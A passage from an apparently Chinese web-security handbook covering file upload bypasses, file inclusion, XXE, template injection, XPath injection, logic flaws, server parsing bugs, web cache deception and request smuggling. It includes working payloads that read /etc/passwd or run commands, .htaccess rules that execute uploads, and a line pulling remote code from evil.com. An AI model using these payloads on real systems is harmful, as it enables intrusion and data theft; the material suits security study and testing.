> 在进行文件操作相关的 API 前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。
>
> 若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。

### 4.6.5  参考链接

-   [Directory traversal by portswigger](https://portswigger.net/web-security/file-path-traversal)

-   [Path Traversal by OWASP](https://www.owasp.org/index.php/Path_Traversal)

-   [path normalization](https://blogs.msdn.microsoft.com/jeremykuhne/2016/04/21/path-normalization/)

-   [Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)



## 4.7  文件读取

> 考虑读取可能有敏感信息的文件

-   ##### 用户目录下的敏感文件

    -   .bash_history

    -   .zsh_history

    -   .profile

    -   .bashrc

    -   .gitconfig

    -   .viminfo

    -   passwd

-   ##### 应用的配置文件

    -   /etc/apache2/apache2.conf

    -   /etc/nginx/nginx.conf

-   ##### 应用的日志文件

    -   /var/log/apache2/access.log

    -   /var/log/nginx/access.log

-   ##### 站点目录下的敏感文件

    -   .svn/entries

    -   .git/HEAD

    -   WEB-INF/web.xml

    -   .htaccess

-   ##### 特殊的备份文件

    -   .swp
    -   .swo
    -   .bak
    -   index.php~
    -   ...

- ##### Python 的 Cache

  ```
  __pycache__ \ __init__ .cpython-35.pyc
  ```

  

## 4.8  文件上传

### 4.8.1  文件类型检测绕过

#### 更改请求绕过

> 有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。同样的，有的站点在后端仅检查了 HTTP Header 中的信息，比如 Content-Type 等，这种检查同样可以通过修改网络请求绕过。

#### Magic检测绕过

> 有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示
>
> | 类型 |           二进制值            |
> | :--: | :---------------------------: |
> | JPG  | FF D8 FF E0 00 10 4A 46 49 46 |
> | GIF  |       47 49 46 38 39 61       |
> | PNG  |          89 50 4E 47          |
> | TIF  |          49 49 2A 00          |
> | BMP  |             42 4D             |

#### 后缀绕过

> 部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。
>
> php 由于历史原因，部分解释器可能支持符合正则 /ph(p\[2-7\]?\|t(ml)?)/ 的后缀，如 php / php5 / pht /
>
> phtml / shtml / pwml / phtm 等可在禁止上传 php 文件时测试该类型。
>
> jsp 引擎则可能会解析 jspx / jspf / jspa / jsw / jsv / jtml 等后缀，asp 支持 asa / asax / cer / cdx /
>
> aspx / ascx / ashx / asmx / asp{80-90} 等后缀。
>
> 除了这些绕过，其他的后缀同样可能带来问题，如 vbs / asis / sh / reg / cgi / exe / dll / com / bat /
>
> pl / cfc / cfm / ini 等。

#### 系统命名绕过

> 在 Windows 系统中，上传 index.php. 会重命名为 . ，可以绕过后缀检查。也可尝试 index.php%20 ， index.php:1.jpg index.php::\$DATA 等。在 Linux 系统中，可以尝试上传名为 index.php/. 或 ./aa/../ index.php/. 的文件

#### .user.ini

> 在 php 执行的过程中，除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（\$\_SERVER\['DOCUMENT_ROOT'\] 所指定的）。如果被执行的 PHP文件在 web 根目录之外，则只扫描该目录。.user.ini 中可以定义除了 PHP_INI_SYSTEM 以外的模式的选项，故可以使用 .user.ini 加上非 php 后缀的文件构造一个 shell，比如 auto_prepend_file=01.gif 。

#### WAF绕过

> 有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。
>
> 另外，Waf 和 Web 系统对 boundary 的处理不一致，可以使用错误的 boundary 来完成绕过。

#### 竞争上传绕过

> 有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成 Web Shell
>
> 的文件并尝试访问，多次之后即可获得 Shell。

### 4.8.2  攻击技巧

#### Apache重写GetShell

> Apache 可根据是否允许重定向考虑上传.htaccess内容为：
>
> ```apache
> AddType application/x-httpd-php .png
> php_flag engine 1
> ```
>
> 就可以用 png 或者其他后缀的文件做 php 脚本了

#### 软链接任意读文件

> 上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件若服务器没有做好防护，可实现任意文件读取的效果

### 4.8.3  防护技巧

-   使用白名单限制上传文件的类型

-   使用更严格的文件类型检查方式

-   限制 Web Server 对上传文件夹的解析

### 4.8.4  参考链接

-   [构造优质上传漏洞 Fuzz 字典](https://www.freebuf.com/articles/web/188464.html)

&nbsp;

## 4.9  文件包含

### 4.9.1  基础

> 常见的文件包含漏洞的形式为 \<?php include(\"inc/\" . \$\_GET\[\'file\'\]); ?\>
>
> 考虑常用的几种包含方式为

-   同目录包含 file=.htaccess

-   目录遍历 ?file=../../../../../../../../../var/lib/locate.db

-   日志注入 ?file=../../../../../../../../../var/log/apache/error.log

-   利用 /proc/self/environ

> 其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试

### 4.9.2  触发 Sink

-   ##### PHP

    -   **include**

        -   在包含过程中出错会报错，不影响执行后续语句

    -   ##### include_once

        -   仅包含一次

    -   ##### require

        -   在包含过程中出错，就会直接退出，不执行后续语句

    -   require_once

### 4.9.3  绕过技巧

> 常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式

#### url 编码绕过

> 如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过

#### 特殊字符绕过

-   某些情况下，读文件支持使用 Shell 通配符，如 ? \* 等

-   url 中使用 ? \# 可能会影响 include 包含的结果

-   某些情况下，unicode 编码不同但是字形相近的字符有同一个效果

#### %00 截断

> 几乎是最常用的方法，条件是 magic_quotes_gpc 关闭，而且 php 版本小于 5.3.4。

#### 长度截断

> Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。
>
> msdn 定义 #define MAX_PATH 260，其中第 260 个字符为字符串结尾的 \\0 ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。
>
> 获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX
>
> /root 得到 255
>
> 那么在长度有限的时候，././././ (n 个) 的形式就可以通过这个把路径爆掉在 php 代码包含中，这种绕过方式要求 php 版本 \< php 5.2.8

#### 伪协议绕过

-   远 程 包 含: 要 求 allow_url_fopen=On allow_url_include=On ，payload 为 ? file=\[http\|https\|ftp\]://websec.wordpress.com/shell.txt 的形式

-   PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求 allow_url_include=On ，payload为 ?file=php://input 的形式

-   Base64: 使用 Base64 伪协议读取文件，payload 为 ?file=php://filter/convert.base64-encode/ resource=index.php 的形式

-   data: 使用 data 伪协议读取文件，payload 为 ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=的形式，要求 allow_url_include=On

#### 协议绕过

> allow_url_fopen 和 allow_url_include 主要是针对 http ftp 两种协议起作用，因此可以使用 SMB、 WebDav 协议等方式来绕过限制。

### 4.9.4  参考链接

-   [Exploit with PHP Protocols](https://www.cdxy.me/?p=752)

-   [lfi cheat sheet](https://highon.coffee/blog/lfi-cheat-sheet/)

&nbsp;

## 4.10  XXE

### 4.10.1  XML 基础

> XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。XML 的语法规范由 DTD （Document Type Definition）来进行控制。

### 4.10.2  基本语法

> XML 文档在开头有 \<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\> 的结构，这种结构被称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。
>
> 除了可选的开头外，XML 语法主要有以下的特性：

-   所有 XML 元素都须有关闭标签

-   XML 标签对大小写敏感

-   XML 必须正确地嵌套

-   XML 文档必须有根元素

-   XML 的属性值需要加引号

> 另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。

### 4.10.3  XXE

> 当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。

### 4.10.4  攻击方式

#### 拒绝服务攻击

> ```html
> <!DOCTYPE data [
> <!ELEMENT data (#ANY)>
> <!ENTITY a0 "dos" >
> <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
> <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
> ]>
> <data>&a2;</data>
> ```
>
> 若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。

#### 文件读取

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

#### SSRF

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/" [
<!ELEMENT data (#ANY)>
]>
<data>4</data>
```

#### RCE

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
<core id="test101">
<description>&xxe;</description>
</core>
</catalog>
```

#### XInclude

```xml-dtd
<?xml version='1.0'?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include href="http://publicServer.com/file.xml">
	</xi:include>
</data>
```

### 4.10.5  参考链接

-   [XML 教程](http://www.w3school.com.cn/xml/)

-   [未知攻焉知防 XXE 漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)

-   [XXE 攻击笔记分享](http://www.freebuf.com/articles/web/97833.html)

-   [从 XML 相关一步一步到 XXE 漏洞](https://xz.aliyun.com/t/6887)

&nbsp;

## 4.11  模版注入

### 4.11.1  简介

> 模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

### 4.11.2  测试方法

-   确定使用的引擎

-   查看引擎相关的文档，确定其安全机制以及自带的函数和变量

-   需找攻击面，尝试攻击

### 4.11.3  测试用例

-   简单的数学表达式，{{ 7+7 }} =\> 14

-   字符串表达式 {{ \"ajin\" }} =\> ajin

- ##### Ruby

  - \<%= 7 \* 7 %\>
  - \<%= File.open(\'/etc/passwd\').read %\>

- ##### Java

  - \${7\*7}

- ##### Twig

  - {{7\*7}}

-   ##### Smarty

    -   {php}echo \`id\`;{/php}

- ##### AngularJS

  - \$eval(\'1+1\')

-   ##### Tornado

    -   引用模块 {% import module %}
    -   =\> {% import os %}{{ os.popen(\"whoami\").read() }}

-   ##### Flask/Jinja2

    - {{ config }}

    - {{ config.items() }}

    - {{get_flashed_messages. globals \[\'current_app\'\].config}}
    
    - {{\'\'. class . mro \[-1\]. subclasses ()}}
    
    - {{ url_for. globals \[\' builtins \'\]. import (\'os\').system(\'ls\') }}
    
      {{ request. init . globals \[\' builtins \'\].open(\'/etc/passwd\').read()}}

-   ##### Django

    -   {{ request }}

    -   {% debug %}

    -   {% load module %}

    -   {% include \"x.html\" %}

    -   {% extends \"x.html\" %}


### 4.11.4  目标

-   创建对象

-   文件读写

-   远程文件包含

-   信息泄漏

-   提权

### 4.11.5  相关属性

#### \_\_class\_\_

python 中的新式类（即显示继承 object 对象的类）都有一个属性 \_\_class__ 用于获取当前实例对应的类，例如 \"\".  \_\_class__ 就可以获取到字符串实例对应的类

#### \_\_mro\_\_

python 中类对象的 \_\_mro__ 属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order）寻找的顺序。

#### \_\_globals\_\_

保存了函数所有的所有全局变量，在利用中，可以使用 \_\_init__ 获取对象的函数，并通过 \_\_globals__ 获取 file os 等模块以进行下一步的利用。

#### \_\_subclasses\_\_()

python 的新式类都保留了它所有的子类的引用， \_\_subclasses__ () 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。

因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的 \_\_subclasses__ () 方法就可以获取想要的类的对象。

### 4.11.6  常见 Payload

```
1.().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()
2.().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.
values()[13]['eval']('__import__("os").popen("ls /").read()' 
```

### 4.11.7  绕过技巧

#### 字符串拼接

> ```
> request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]
> ```

#### 使用参数绕过

```python
params = {
'clas': '__class__',
'mr': '__mro__',
'subc': '__subclasses__'
}
data = {
"data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
}
r = requests.post(url, params=params, data=data)
print(r.text)
```

### 4.11.8  参考链接

- [服务端模版注入](https://zhuanlan.zhihu.com/p/28823933)

-   [用 Python 特性任意代码执行](http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/)

&nbsp;

## 4.12  Xpath 注入

### 4.12.1  Xpath 定义

> XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。

### 4.12.2  Xpath 注入攻击原理

> XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath 注入攻击的实现原理。
>
> 在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password）两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user表中的用户名（username）和密码（password）的结果来进行授权访问，
>
> 例存在 user.xml 文件如下：
>
> ```xml
> <users>
> 	<user>
> 		<firstname>Ben</firstname>
> 		<lastname>Elmore</lastname>
> 		<loginID>abc</loginID>
> 		<password>test123</password>
> 	</user>
> 	<user>
> 		<firstname>Shlomy</firstname>
> 		<lastname>Gantz</lastname>
> 		<loginID>xyz</loginID>
> 		<password>123test</password>
> 	</user>
> ```
>
> 则 在 XPath 中 其 典 型 的 查 询 语 句 为：//users/user\[loginID/text()=\'xyz\'and password/ text()=\'123test\'\]
>
> 但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用户传入一个 login 和 password，例如 loginID = \'xyz\' 和 password = \'123test\' ，则该查询语句将返回 true。但如果用户传入类似 \' or 1=1 or \'\'=\' 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：//users/ user\[loginID/text()=\'\'or 1=1 or \'\'=\'\' and password/text()=\'\' or 1=1 or \'\'=\'\'\]
>
> 这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文档信息。

## 4.13  逻辑漏洞 / 业务漏洞

### 4.13.1  简介

> 逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}在实际开发中，因为开发者水平不一没有安全意识，而 业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。

### 4.13.2  安装逻辑

-   查看能否绕过判定重新安装

-   查看能否利用安装文件获取信息

-   看能否利用更新功能获取信息

### 4.13.3  交易

#### 购买

-   修改支付的价格

-   修改支付的状态

-   修改购买数量为负数

-   修改金额为负数

-   重放成功的请求

-   并发数据库锁处理不当

#### 业务风控

-   刷优惠券

-   套现

### 4.13.4  账户

#### 注册

-   覆盖注册

-   尝试重复用户名

-   注册遍历猜解已有账号

#### 密码

-   密码未使用哈希算法保存

-   没有验证用户设置密码的强度

#### 邮箱用户名

-   前后空格

-   大小写变换

#### Cookie

-   包含敏感信息

-   未验证合法性可伪造

#### 手机号用户名

-   前后空格
-   +86

#### 登录

-   **撞库**

    -   设置异地登录检查等机制

-   账号劫持

-   ##### 恶意尝试帐号密码锁死账户

    -   需要设置锁定机制与解锁机制

-   不安全的传输信道

-   登录凭证存储在不安全的位置

#### 找回密码

-   重置任意用户密码

-   密码重置后新密码在返回包中

-   Token 验证逻辑在前端

-   X-Forwarded-Host 处理不正确

-   找回密码功能泄露用户敏感信息

#### 修改密码

-   越权修改密码

-   修改密码没有旧密码验证

#### 申诉

-   身份伪造

-   逻辑绕过

#### 更新

-   ORM 更新操作不当可更新任意字段

-   权限限制不当可以越权修改

#### 信息查询

-   权限限制不当可以越权查询

-   用户信息 ID 可以猜测导致遍历

### 4.13.5  2FA

-   重置密码后自动登录没有 2FA

-   OAuth 登录没有启用 2FA

-   2FA 可爆破

-   2FA 有条件竞争

-   修改返回值绕过

-   激活链接没有启用 2FA

-   可通过 CSRF 禁用 2FA

### 4.13.6  验证码

-   验证码可重用

-   验证码可预测

-   验证码强度不够

-   验证码无时间限制或者失效时间长

-   验证码无猜测次数限制

-   验证码传递特殊的参数或不传递参数绕过

-   验证码可从返回包中直接获取

-   验证码不刷新或无效

-   验证码数量有限

-   验证码在数据包中返回

-   修改 Cookie 绕过

-   修改返回包绕过

-   验证码在客户端生成或校验

-   验证码可 OCR 或使用机器学习识别

-   验证码用于手机短信/邮箱轰炸

### 4.13.7  Session

-   Session 机制

-   Session 猜测 / 爆破

-   Session 伪造

-   Session 泄漏

-   Session Fixation

### 4.13.8  越权

-   #### 未授权访问

    -   静态文件

    -   通过特定 url 来防止被访问

-   #### 水平越权

    -   攻击者可以访问与他拥有相同权限的用户的资源

    -   权限类型不变，ID 改变

-   #### 垂直越权

    -   低级别攻击者可以访问高级别用户的资源

    -   权限 ID 不变，类型改变

-   #### 交叉越权

    -   权限 ID 改变，类型改变

### 4.13.9  随机数安全

-   使用不安全的随机数发生器

-   使用时间等易猜解的因素作为随机数种子

### 4.13.10  其他

-   用户/订单/优惠券等 ID 生成有规律，可枚举

-   接口无权限、次数限制

-   加密算法实现误用

-   执行顺序

-   敏感信息泄露

### 4.13.11  参考链接

-   [水平越权漏洞及其解决方案](http://blog.csdn.net/mylutte/article/details/50819146#10006-weixin-1-52626-6b3bffd01fdde4900130bc5a2751b6d1)

-   [细说验证码安全测试思路大梳理](https://xz.aliyun.com/t/6029)

&nbsp;

## 4.14  配置与策略安全

### 4.14.1  认证策略

#### 密码策略

-   未限制密码最低位数

-   未限制密码必须包含字符集

-   为常用密码

-   ##### 个人信息相关

    -   手机号

    -   生日

    -   姓名

    -   用户名

- ##### 未检测常见弱密码

  - 已泄露的常用密码
  - 键盘模式

#### 加密实现

-   在客户端存储私钥


### 4.14.2  权限配置

-   运维人员权限粒度过大

-   客服人员权限粒度过大

### 4.14.3  供应链安全

#### 三方认证

-   利用被攻击的第三方服务账号登录其他平台账号

#### 三方库/软件

-   公开漏洞后没有及时更新

## 4.15  中间件

### 4.15.1  IIS

#### IIS 6.0

-   **后缀解析 /xx.asp;.jpg**

    -   服务器默认不解析 ; 号及其后面的内容，相当于截断。

-   目录解析 /xx.asp/xx.jpg (xx.asp 目录下任意解析)

-   默认解析 xx.asa xx.cer xx.cdx

-   PROPFIND 栈溢出漏洞

-   RCE CVE-2017-7269

#### IIS 7.0-7.5 / Nginx \<= 0.8.37

在 Fast-CGI 开启状态下，在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为 php 文件。

#### PUT 漏洞

-   开启 WebDAV

-   拥有来宾用户， 来宾用户拥有上传权限

-   可任意文件上传

#### Windows 特性

> Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 xx. php\[空格\] ，xx.php.，xx.php/，xx.php::\$DATA 上传脚本文件。

#### 文件名猜解

> 在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：

-   文件名为原文件名前 6 位字符加上 \~1 ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。

-   后缀名不超过 3 位，超过部分会被截断

-   所有小写字母均转换成大写的字母

-   文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件

> IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、 TRACE 六种，需要安装 ASP.NET。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。
>
> 这种方法的局限性在于：

-   文件夹名前 6 位字符带点"."，扫描程序会认为是文件而不是文件夹，最终出现误报

-   不支持中文文件名

> 这种方法可以通过命令 fsutil behavior set disable8dot3 1 关闭 NTFS 8.3 文件格式的支持来修复。

#### 参考链接

-   [利用 Windows 特性高效猜测目录](https://xz.aliyun.com/t/2318)

-   [Uploading web.config for Fun and Profit 2](https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/)

### 4.15.2  Apache

#### 后缀解析

> test.php.x1.x2.x3 （x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀，若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析

#### .htaccess

> 当 AllowOverride 被启用时，上传启用解析规则的.htaccess
>
> ```php
> AddType application/x-httpd-php .jpg
> ```
>
> ```php
> php_value auto_append_file .htaccess
> #<?php phpinfo();
> ```
>
> ```php
> Options ExecCGI
> AddHandler cgi-script .jpg
> ```
>
> ```php
> Options +ExecCGI
> AddHandler fcgid-script .gif
> FcgidWrapper "/bin/bash" .gif
> ```
>
> ```php
> php_flag allow_url_include 1
> php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
> #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
> #php_value auto_append_file https://evil.com/evil-code.txt
> ```

#### 目录遍历

> 配置 Options +Indexes 时 Apache 存在目录遍历漏洞。

#### CVE-2017-15715

%0A 绕过上传黑名单。 

#### lighttpd

xx.jpg/xx.php

#### 参考链接

-   [Apache 上传绕过](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)


### 4.15.3  Nginx

#### Fast-CGI 关闭

> 在 Fast-CGI 关闭的情况下，Nginx 仍然存在解析漏洞：在文件路径 (xx.jpg) 后面加上 %00.php ，即 xx. jpg%00.php 会被当做 php 文件来解析

#### Fast-CGI 开启

> 在 Fast-CGI 开启状态下，在文件路径后加上 /xx.php ，则 xx.jpg/xx.php 会被解析为 php 文件

#### CVE-2013-4547

> a.jpg\\x20\\x00.php

#### 配置错误

#### 目录穿越

> 如果配置中存在类似 location /foo { alias /bar/; } 的配置时，/foo../ 会被解析为 /bar/../ 从而导致目录穿越的发生。

#### 目录遍历

> 配置中 autoindex on 开启时，Nginx 中存在目录遍历漏洞。

#### 参考链接

-   [CVE-2013-4547 Nginx 解析漏洞深入利用及分析](http://www.91ri.org/9064.html)


## 4.16  Web Cache 欺骗攻击

### 4.16.1  简介

> 网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。
>
> 例如，网站 [htttp://www.example.com](http://www.example.com/) 配置了反向代理。对于那些包含用户个人信息的页面，如 http:// [www.example.com/home.php](http://www.example.com/home.php) ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图
>
> 片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并 忽略 HTTP
>
> 缓存头。
>
> Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不存在的 URL 时，如 <http://www.example.com/home.php/non-existent.css> ，浏览器发送 get 请求，依赖于使用的技术与配置，服务器返回了页面 <http://www.example.com/home.php> 的内容，同时 URL 地址仍然是 <http://www.example.com/home.php/non-existent.css>，http 头的内容也与直接访问 [http://www.](http://www/) example.com/home.php 相同，cacheing header、content-type（此处为 text/html）也相同。

### 4.16.2  漏洞成因

> 当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问 <http://www.example.com/> home.php/no-existent.css 时，会发生什么呢？整个响应流程如下：

1.  浏览器请求 <http://www.example.com/home.php/no-existent.css> ;
2.  服务器返回 <http://www.example.com/home.php> 的内容 (通常来说不会缓存该页面);
3.  响应经过代理服务器;
4.  代理识别该文件有 css 后缀;
5.  在缓存目录下，代理服务器创建目录 home.php ，将返回的内容作为 non-existent.css 保存。


### 4.16.3  漏洞利用

> 攻击者欺骗用户访问 <http://www.example.com/home.php/logo.png?www.myhack58.com> , 导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。

### 4.16.4  漏洞存在的条件

> 漏洞要存在，至少需要满足下面两个条件：

1.  web cache 功能根据扩展进行保存，并忽略 caching header;

2.  当访问如 <http://www.example.com/home.php/non-existent.css> 不存在的页面，会返回 home.php 的内容。

### 4.16.5  漏洞防御

> 防御措施主要包括 3 点：

1.  设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题;
2.  如果缓存组件提供选项，设置为根据 content-type 进行缓存;
3.  访问 <http://www.example.com/home.php/non-existent.css> 这类不存在页面，不返回 home.php 的内容，而返回 404 或者 302。


### 4.16.6  Web Cache 欺骗攻击实例

#### Paypal

> Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交易数据、emaill 地址等信息。受该攻击的部分页面包括：

-   [https://www.paypal.com/myaccount/home/attack.css](http://www.paypal.com/myaccount/home/attack.css)

-   [https://www.paypal.com/myaccount/settings/notifications/attack.css](http://www.paypal.com/myaccount/settings/notifications/attack.css)

-   https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=\_history-details 。

### 4.16.7  参考链接

-   [practical web cache poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)

-   [End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks](https://www.usenix.org/conference/usenixsecurity18/presentation/hao)

&nbsp;

## 4.17  HTTP 请求走私

### 4.17.1  简介

> HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 [文章](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf) 中被提出。

### 4.17.2  成因

> 请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即 Content-Length 和 Transfer-Encoding 标头。

### 4.17.3  分类

-   CLTE：前端服务器使用 Content-Length 头，后端服务器使用 Transfer-Encoding 头

-   TECL：前端服务器使用 Transfer-Encoding 标头，后端服务器使用 Content-Length 标头。

-   TETE：前端和后端服务器都支持 Transfer-Encoding 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。

### 4.17.4  攻击

#### CL 不为 0 的 GET 请求

> 当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉
>
> GET 请求中的 Content-Length 头，不进行处理。例如下面这个例子：
>
> ```http
> GET / HTTP/1.1\r\n
> Host: example.com\r\n
> Content-Length: 44\r\n
> 
> GET /secret HTTP/1.1\r\n
> Host: example.com\r\n
> \r\n
> ```
>
> 前端服务器处理了 Content-Length ，而后端服务器没有处理 Content-Length ，基于 pipeline 机制认为这是两个独立的请求，就造成了漏洞的发生。

#### CL-CL

> 根据 RFC 7230，当服务器收到的请求中包含两个 Content-Length ，而 两者的值不同时，需要返回 400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 Content-Length 值时，就会出现漏洞。例如：
>
> ```HTTP
> POST / HTTP/1.1\r\n
> Host: example.com\r\n
> Content-Length: 8\r\n
> Content-Length: 7\r\n
> 
> 12345\r\n
> a
> ```
>
> 这个例子中 a 就会被带入下一个请求，变为 aGET / HTTP/1.1\\r\\n 。

#### CL-TE

> CL-TE 指前端服务器处理 Content-Length 这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉
>
> Content-Length ，处理 Transfer-Encoding 。例如：
>
> ```HTTP
> POST / HTTP/1.1\r\n
> Host: example.com\r\n
> ...
> Connection: keep-alive\r\n
> Content-Length: 6\r\n
> Transfer-Encoding: chunked\r\n
> \r\n
> 0\r\n
> \r\n
> a
> ```

> 这个例子中 a 同样会被带入下一个请求，变为 aGET / HTTP/1.1\\r\\n 。

#### TE-CL

> TE-CL 指前端服务器处理 Transfer-Encoding 请求头，而后端服务器处理 Content-Length 请求头。例如：
>
> ```HTTP
> POST / HTTP/1.1\r\n
> Host: example.com\r\n
> ...
> Content-Length: 4\r\n
> Transfer-Encoding: chunked\r\n
> \r\n
> 12\r\n
> aPOST / HTTP/1.1\r\n
> \r\n
> 0\r\n
> \r\n
> ```

#### TE-TE

